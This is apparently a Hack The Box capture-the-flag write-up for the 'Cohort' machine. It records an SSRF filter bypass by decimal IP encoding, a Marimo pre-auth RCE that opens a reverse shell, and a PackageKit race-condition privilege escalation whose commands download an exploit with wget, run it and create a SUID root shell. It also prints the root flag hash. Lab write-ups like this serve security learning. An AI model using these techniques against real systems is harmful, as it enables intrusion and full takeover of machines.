# HTB — Cohort | Root Flag Writeup

**Difficulty:** Easy | **OS:** Linux | **Status:** ✅ Rooted

---

## Attack Chain Summary

```
SSRF → Internal Marimo RCE → Shell as marimo → CVE-2026-41651 → root
```

---

## 1. Initial Recon

```bash
rustscan -a cohort.htb -- -sCV
```

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH (OpenSSH) | Post-cred access |
| 80/443 | nginx | cohort.htb web portal |
| 5000 | Flask API | insights-api (internal) |
| 8888 | Marimo | localhost-only notebook server |

---

## 2. Foothold — SSRF → Marimo RCE (CVE-2026-39987)

- `portal.html` accepts a URL and the server fetches it → SSRF
- Bypassed SSRF filter using decimal IP encoding to reach `127.0.0.1:8888`
- Marimo instance discovered via vhost (`nb-*.cohort.htb`)
- Exploited **CVE-2026-39987** (Marimo pre-auth RCE via WebSocket)
- Caught reverse shell as `marimo`

```bash
python3 cve-2026-39987.py --target nb-1be3782a8afd3ad5.cohort.htb --lhost <IP> --lport 4444
```

**User flag:** `user.txt` → in `/home/marimo/`

---

## 3. Privilege Escalation — CVE-2026-41651 (Pack2TheRoot)

**Vulnerability:** PackageKit TOCTOU race condition in `pk-transaction.c`
**Affected versions:** PackageKit 1.0.2 – 1.3.4
**Box version:** 1.2.8 (vulnerable)

### How it works

Two async D-Bus `InstallFiles()` calls are fired in rapid succession:
1. First call with `SIMULATE` flag → bypasses polkit auth, queues callback
2. Second call with malicious payload → cached flags overwritten, processed as root

PackageKit executes the malicious maintainer script as root.

### Exploit steps

```bash
# On Kali — grab Python PoC
git clone https://github.com/mawussid/CVE-2026-41651-Python
python3 -m http.server 8000

# On box
wget http://<KALI_IP>:8000/cve-2026-41651.py -O /tmp/exploit.py
python3 /tmp/exploit.py --suid-path /tmp/rootbash

# Get root shell
/tmp/rootbash -p
cat /root/root.txt
```

### Result

```
uid=1000(marimo) gid=1000(marimo) euid=0(root)
```

---

## 4. Flags

| Flag | Hash |
|------|------|
| user.txt | (in /home/marimo/) |
| **root.txt** | `287091f502d69c599d018bc054eb58a2` |

---

## 5. Key Takeaways

- Always probe SSRF for internal services — port 8888 was the real target
- SSRF filter bypass: decimal IP encoding (`http://2130706433:8888/`)
- needrestart CVE approach works but requires apt timer — PackageKit D-Bus race is instant
- CVE-2026-41651 requires no password, no sudo — just local shell access

---

## Tools Used

- `rustscan` / `nmap` — port scanning
- `ffuf` / `gobuster` — vhost and content discovery
- `Burp Suite` — SSRF analysis
- `CVE-2026-39987 PoC` — Marimo pre-auth RCE
- `CVE-2026-41651 PoC` — Pack2TheRoot PackageKit LPE

---

*Rooted by Tith Sopanha | HTB Cohort | August 2026*
